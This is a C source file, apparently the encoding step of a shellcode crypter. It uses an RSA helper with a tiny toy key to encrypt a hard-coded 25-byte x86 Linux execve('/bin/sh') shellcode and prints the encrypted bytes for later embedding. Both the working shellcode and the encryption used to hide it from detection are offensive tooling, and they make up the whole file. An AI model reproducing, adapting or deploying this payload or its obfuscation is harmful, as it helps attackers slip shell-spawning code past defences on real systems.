#include <stdio.h>
#include "rsa.h"
#include <string.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
  struct public_key_class pub[1];
  rsa_gen_pub_key(pub,1067,257);

  unsigned char message[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; //execve-shellcode
  int i;

  long long *encrypted = rsa_encrypt(message, sizeof(message), pub);
  if (!encrypted){
    fprintf(stderr, "Error in encryption!\n");
    return 1;
  }
  printf("Encrypted:\n{");
  for(i=0; i < sizeof(message)-1; i++){
    printf("0x%llx,", (long long)encrypted[i]);
  }  
  printf("}\n");
  printf("encrypted code length=%d\n",sizeof(message)-1);

  printf("\n");
  free(encrypted);
  return 0;
}
